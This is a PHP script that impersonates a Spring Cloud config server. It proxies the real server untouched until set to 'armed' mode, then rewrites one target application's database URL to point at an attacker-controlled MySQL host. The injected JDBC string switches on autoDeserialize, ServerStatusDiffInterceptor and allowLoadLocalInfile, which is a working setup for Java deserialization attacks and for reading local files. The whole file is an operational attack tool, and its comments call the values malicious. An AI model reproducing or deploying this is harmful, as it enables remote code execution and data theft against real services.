#!/usr/bin/env php
<?php
/* fake-config — config-server impersonator (php -S router script)
 * Run:  php -S 0.0.0.0:8762 fake_config.php
 * Env:  UPSTREAM=http://172.32.16.138:8762   (real config-server)
 *       MODE=passthrough|armed
 *       TARGET_APP=kubiex-dax-aux            (only this app gets the malicious values)
 *       ROGUE=host:port                      (our rogue MySQL)
 *       LOGF=/dev/shm/fakecfg.log
 * passthrough = byte-identical proxy of upstream (harmless to every other consumer)
 * armed       = TARGET_APP config gets kubiex.*.datasource.*.url swapped to rogue MySQL
 */

$UPSTREAM   = getenv('UPSTREAM') ?: 'http://172.28.0.11:8762';
$MODE       = getenv('MODE') ?: 'passthrough';
$TARGET_APP = getenv('TARGET_APP') ?: 'kubiex-dax-aux';
$ROGUE      = getenv('ROGUE') ?: '172.28.0.30:3306';
$LOGF       = getenv('LOGF') ?: '/dev/shm/fakecfg.log';
$USER       = getenv('DSUSER') ?: 'rogue';
$PASS       = getenv('DSPASS') ?: 'rogue';

$uri  = $_SERVER['REQUEST_URI'] ?? '/';
$path = parse_url($uri, PHP_URL_PATH);
file_put_contents($LOGF, date('H:i:s') . " {$_SERVER['REQUEST_METHOD']} $path mode=$MODE\n", FILE_APPEND);

if ($path === '/actuator/health') {
    header('Content-Type: application/json');
    echo '{"status":"UP"}';
    return true;
}

$ctx = stream_context_create(['http' => ['timeout' => 8, 'ignore_errors' => true]]);
$orig = @file_get_contents($UPSTREAM . $path, false, $ctx);
if ($orig === false) {
    http_response_code(502);
    header('Content-Type: application/json');
    echo '{"error":"upstream unreachable"}';
    return true;
}

if ($MODE === 'armed' && str_starts_with($path, '/' . $TARGET_APP . '/')) {
    $j = json_decode($orig, true);
    if (is_array($j) && isset($j['propertySources'])) {
        $jdbc = 'jdbc:mysql://' . $ROGUE . '/auxdb'
              . '?autoDeserialize=true'
              . '&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor'
              . '&allowLoadLocalInfile=true'
              . '&useSSL=false&allowPublicKeyRetrieval=true&connectTimeout=5000&socketTimeout=8000';
        foreach ($j['propertySources'] as $i => $ps) {
            if (!is_array($ps) || !isset($ps['source']) || !is_array($ps['source'])) continue;
            $j['propertySources'][$i]['source']['kubiex.aux.datasource.master.url'] = $jdbc;
            $j['propertySources'][$i]['source']['kubiex.aux.datasource.master.username'] = $USER;
            $j['propertySources'][$i]['source']['kubiex.aux.datasource.master.password'] = $PASS;
        }
        file_put_contents($LOGF, date('H:i:s') . " ARMED-INJECT for $path\n", FILE_APPEND);
        header('Content-Type: application/json');
        echo json_encode($j);
        return true;
    }
}
header('Content-Type: application/json');
echo $orig;
